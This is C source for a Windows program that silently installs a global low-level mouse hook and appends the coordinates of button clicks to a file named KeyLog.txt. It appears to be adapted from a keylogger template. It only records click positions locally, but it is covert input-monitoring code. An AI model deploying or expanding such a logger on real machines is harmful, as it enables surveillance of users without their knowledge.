#include <Windows.h>
#include <stdio.h>
#define PATH L"X:\\KeyLog.txt"
#define RUS 1049
#define ENG 1033
#define SIZE_STR 20

LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam);
DWORD LKey = 0, RKey = 0, CKey = 0, TKey = 0;
POINT p;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE HpREViNSTANCE, PSTR pCmdLine, int nCmdShow)
{
	HHOOK hHook = SetWindowsHookExW(WH_MOUSE_LL, LogMouse, NULL, NULL);
	MSG msg = { 0 };
	while (GetMessageW(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hHook);

	return 0;
}

VOID WriteToFile(LPWSTR wstr)
{
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}

LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam)
{
	LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
	if (wParam == 513)
	{
		GetCursorPos(&p);
		swprintf(String, 150, L"%d %d\n", p.x, p.y);
	}
	if (wParam == 516)
	{
		GetCursorPos(&p);
		swprintf(String, 150, L"%d %d\n", p.x, p.y);
	}
	if (wParam == 520)
	{
		GetCursorPos(&p);
		swprintf(String, 150, L"%d %d\n", p.x, p.y);
	}
	WriteToFile(String);
	free(String);
	return CallNextHookEx(NULL, iCode, wParam, lParam);
}